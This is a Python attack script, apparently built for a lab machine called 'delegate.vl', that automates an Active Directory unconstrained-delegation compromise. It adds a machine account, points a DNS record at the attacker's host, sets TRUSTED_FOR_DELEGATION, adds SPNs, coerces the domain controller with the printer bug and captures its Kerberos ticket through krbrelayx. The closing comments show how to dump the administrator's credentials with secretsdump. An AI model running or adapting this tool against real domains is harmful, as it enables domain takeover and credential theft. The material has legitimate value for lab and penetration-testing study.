#!/usr/bin/env python3 

import os, sys, time, subprocess
try:
    import argparse
except ImportError:
    os.system("python3 -m pip install argparse")
    os.system("python -m pip install argparse")

from subprocess import Popen
try:
    from colorama import Fore
except ImportError:
    os.system("python3 -m pip install colorama")
    os.system("python -m pip install colorama")

RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
RESET = Fore.RESET

parser = argparse.ArgumentParser(description="SEDelegate", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-r", "--RHOST", action="store", help="DC IP")
parser.add_argument("-l", "--LHOST", action="store", help="DC IP")
parser.add_argument("-c", "--ComputerName", action="store", help="Whatever name you want for the computer ex: carrot")
parser.add_argument("-p", "--ComputerPassword", action="store", help="Whatever password you want to use for the computer ex: TestPassword321")
parser.add_argument("-d", "--DOMAIN", action="store", help="Domain Name ex: invoke.local")
parser.add_argument("-dc", "--DC", action="store", help="FQDN ex: dc01.invoke.local")
parser.add_argument("-u", "--USERNAME", action="store", help="Username of user that has SEDelegate Privilege")
parser.add_argument("-P", "--PASSWORD", action="store", help="Password of user that has SEDelegate Privilege")
parser.add_argument("-N", "--NTLM", action="store", help="NTML Hash for computer-password, if unknown go to https://codebeautify.org/ntlm-hash-generator")

args = parser.parse_args()
parser.parse_args(args=None if sys.argv[1:] else ['--help'])

RHOST = args.RHOST
DOMAIN = args.DOMAIN
USERNAME = args.USERNAME
PASSWORD = args.PASSWORD
COMPN = args.ComputerName
COMPP = args.ComputerPassword
LHOST = args.LHOST
DC = args.DC
NTLM = args.NTLM

def KERB():
    print(f"{YELLOW}\nDoing a git clone on kerbrelayx for all the tools that are needed{RESET}")
    s = Popen([f"git clone https://github.com/dirkjanm/krbrelayx.git"], shell=True)
    s.wait()
    s = Popen([f"cd krbrelayx"], shell=True)
    s.wait()

def BLOODAD():
    print(f"{YELLOW}\nInstalling BloodyAD{RESET}")
    s = Popen([f"sudo apt-get install libkrb5-dev"], shell=True)
    s.wait()
    s = Popen([f"pip3 install bloodyad"], shell=True)
    s.wait()

def ADDCOMPUTER():
    print(f"{YELLOW}\nAdding Computer with Computer name {COMPN} and password {COMPP}{RESET}")
    s = Popen([f"addcomputer.py -dc-ip {RHOST} -computer-pass {COMPP} -computer-name {COMPN} {DOMAIN}/{USERNAME}:{PASSWORD}"], shell=True)
    s.wait()

def DNSTOOL():
    print(f"{YELLOW}\nAdding DNS{RESET}")
    s = Popen([f"python3 krbrelayx/dnstool.py -u 'delegate.vl\\carrot$' -p {COMPP} -r {COMPN}.{DOMAIN} -d {LHOST} --action add {DC} -dns-ip {RHOST}"], shell=True)
    s.wait()

def BLOODYAD():
    print(f"{YELLOW}\nCreating TRUSTED_FOR_DELEGATION with {COMPN}{RESET}")
    s = Popen([f"bloodyAD -u {USERNAME} -p {PASSWORD} --host {DC} add uac '{COMPN}$' -f TRUSTED_FOR_DELEGATION"], shell=True)
    s.wait()

def ADDSPN():
    print(f"{YELLOW}\nAdding SPN for {COMPN} with CIFS{RESET}")
    s = Popen([f"python3 krbrelayx/addspn.py -u '{DOMAIN}\\{USERNAME}' -p {PASSWORD} -s cifs/{COMPN}.{DOMAIN} -t '{COMPN}$' -dc-ip {RHOST} {DC} --additional"], shell=True)
    s.wait()
    s = Popen([f"python3 krbrelayx/addspn.py -u '{DOMAIN}\\{USERNAME}' -p {PASSWORD} -s cifs/{COMPN}.{DOMAIN} -t '{COMPN}$' -dc-ip {RHOST} {DC}"], shell=True)
    s.wait()

def KRB5():
    print(f"{YELLOW}\nRunning krbrelayx and printerbug with hash {NTLM}{RESET}")
    s = Popen ([f"""python3 krbrelayx/printerbug.py '{COMPN}$:{COMPP}'@{RHOST} {COMPN}.delegate.vl &"""], shell=True)
    s = Popen([f"python3 krbrelayx/krbrelayx.py -hashes :{NTLM}"], shell=True)
    time.sleep(5)
    exit()

def main():
    print(f"{YELLOW}\nMay need to run twice{RESET}")
    print(f"{RED}Make sure both Domain and FQDN are within /etc/hosts")
    time.sleep(2)
    print(f"{RED}Read the actual script to see what to do when the ccache is dropped (go to the bottom of the script) {RESET}")
    time.sleep(2)
    KERB()
    BLOODAD()
    ADDCOMPUTER()
    DNSTOOL()
    BLOODYAD()
    ADDSPN()
    KRB5()

#When script is done getting ccache you can exit with a ctrl+c
#at this point you should have recieved a ccache ticket export that with the following
#export KRB5CCNAME=./'<ccache ticket>'  ex: export KRB5CCNAME=./'DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache'
#you can the do a secrets dump with the following secretsdump.py 'FQDN' -no-pass -k -just-dc-user administrator
#ex secretsdump.py 'dc1$'@dc1.delegate.vl -no-pass -k -just-dc-user administrator

if __name__ == '__main__':
    main()
